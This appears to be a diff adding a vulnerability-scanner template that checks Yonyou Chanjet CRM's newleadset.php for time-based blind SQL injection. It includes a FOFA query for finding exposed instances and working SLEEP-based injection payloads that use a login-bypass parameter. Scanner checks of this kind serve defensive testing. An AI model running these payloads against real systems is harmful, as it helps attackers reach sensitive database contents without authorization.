@@ -1,0 +1,33 @@
+id: yongyou-crm-newleadset-sqli
+
+info:
+  name: 用友畅捷通CRM newleadset SQL 注入漏洞
+  author: avic123
+  severity: high
+  verified: true
+  description: |
+    畅捷CRM系统newleadset存在SQL注入漏洞 ，攻击者可以利用该漏洞获取网站后台数据库敏感信息。
+    FOFA: app="畅捷通-畅捷CRM"
+  reference:
+    - https://mp.weixin.qq.com/s/H7C-qVmGBU0Xv7qHy0xSrQ
+  tags: yongyou,crm,sqli
+  created: 2025/08/29
+
+set:
+  hostname: request.url.host
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /lead/newleadset.php?new_id=1&gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(5)))HAjH)--+-&DontCheckLogin=1
+    expression: >-
+      response.status == 200 && response.latency <= 7000 &&  response.latency >= 5000
+  r1:
+    request:
+      method: GET
+      path: /lead/newleadset.php?new_id=1&gblOrgID=1+AND+(SELECT+5244+FROM+(SELECT(SLEEP(10)))HAjH)--+-&DontCheckLogin=1
+    expression: >-
+      response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
+
+expression: r0() && r1()
